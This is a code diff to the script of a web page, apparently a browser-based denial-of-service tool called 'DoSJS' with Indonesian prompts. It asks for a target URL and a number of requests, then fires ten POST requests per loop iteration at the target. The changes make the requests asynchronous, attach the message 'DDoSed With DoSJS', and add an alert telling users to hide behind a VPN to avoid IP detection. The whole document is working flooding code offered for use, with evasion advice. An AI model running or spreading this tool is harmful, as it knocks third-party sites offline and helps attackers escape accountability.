@@ -16,7 +16,9 @@
 </body>
 </html>
 <script>
+alert('NOTE : We recomendded you must using VPN to avoid IP Detect.')
 var i;
+var message = "DDoSed With DoSJS";
 var url = prompt('Masukin target URL : ');
 var jumlah = prompt('Masukkan Jumlah Request : ');
 if (jumlah == null || jumlah == 0) {
@@ -28,26 +30,26 @@ if (yesno == true) {
 for (i = 0; i < Number(jumlah); i++) {
 refreq.innerHTML = i + " Requests send...";
 const x = new XMLHttpRequest();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
-x.open("POST", String(url));
-x.send();
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
+x.open("POST", String(url), true);
+x.send(message);
 }
 }
 else {
